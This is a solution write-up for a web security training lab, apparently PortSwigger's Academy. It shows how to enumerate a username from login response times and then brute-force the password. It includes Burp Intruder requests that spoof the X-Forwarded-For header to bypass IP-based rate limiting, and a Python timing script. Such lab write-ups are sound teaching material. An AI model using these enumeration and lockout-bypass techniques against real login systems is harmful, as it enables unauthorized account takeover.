# Lab: Username enumeration via response timing

## Lab

This lab is vulnerable to username enumeration using its response times. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page. 

## Hint

To add to the challenge, the lab also implements a form of IP-based brute-force protection. However, this can be easily bypassed by manipulating HTTP request headers. 

## Solution

To bypass IP-based brute-force protection in each request we change the IP address of the each request by `X-Forwarded-For` header.

Maybe this application only check whether password is correct if the username is balid. This extra step can cause increase in response time. This extra time is usually small and very difficult to see. To increase that time, we can increase the length of the password that the application takes longer to handle requests.

To confirm that we try login with or credentials: `wiener:peter` the response status is 302 and response time approximately 700 milliseconds

Let try login with wrong password: `wiener:a` the response status is 200 and response time approximately 700 milliseconds.

Now try login with wrong password but this time increase password length: `wiener: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa` the response status is 200 and response time approximately 3000 milliseconds

So that,Depending on the response time we can determine that the username is valid and or not.

Using the above to brute force the username with Intruder in Burp Suite. Remember that we must add the `X-Forwarded-For` header to bypass the IP-based brute-force protection.
```HTTP
POST /login HTTP/1.1
Host: 0a3200e603036ed7c074693600d90055.web-security-academy.net
Cookie: session=rSHBUVybmjUUwO2Gp0xDyfziTFIUtqXR
Content-Length: 507
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://0a3200e603036ed7c074693600d90055.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a3200e603036ed7c074693600d90055.web-security-academy.net/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
X-Forwarded-For: 118.71.204.§229§

username=§wiener§&password=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

In Intruder we select the attack type is Pitchfork. 
- With payload set 1 we set payload type is Numbers from 1 to 100 (depend on the number of usernames we brute force in payload set 2) with step is 1. 
- With payload set 2 we set payload type is Simple list and load file contain the list usernames is provided from the lab.

After start attack we check the response time.The valid username, which returns response time approximately 3000 milliseconds.

Based on such above idea we can use python to make the following script to find out the valid username.

```python
import requests
import time
url = 'https://0a27002a04cee09cc0370c6300cb0095.web-security-academy.net/login'
file = open('../shortlist/usernames.txt','r')
username = file.readline().strip()

for i in range(101):
    a = time.time()
    x = requests.post(url, data={'username': username, 'password': 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'}, headers={'X-Forwarded-For': '118.71.204.'+ str(i)})
    if (time.time() - a > 3 ):
        print(username)
        break
    username = file.readline().strip()
```

After found out the username is `al`, next step is brute force password. the valid password, which returns status code is 302.

In tab Intruder back to Positions page modify `username` to `al` and insert new password marker into `password`.
```HTTP
POST /login HTTP/1.1
Host: 0a3200e603036ed7c074693600d90055.web-security-academy.net
Cookie: session=rSHBUVybmjUUwO2Gp0xDyfziTFIUtqXR
Content-Length: 507
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://0a3200e603036ed7c074693600d90055.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a3200e603036ed7c074693600d90055.web-security-academy.net/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
X-Forwarded-For: 118.71.204.§229§

username=al&password=§a§
```
Now switch to Payload page.
- Keep payload set 1, because we still need that to bypass IP-based brute-force protection
- With payload set 2 we clear the current payload and load file contain the list passwords is provided from lab.

Start and find the request, which returns 302 status code. The password is sent in this request is the valid password (`jessica`).

Login with `al:jessica` to solve this lab.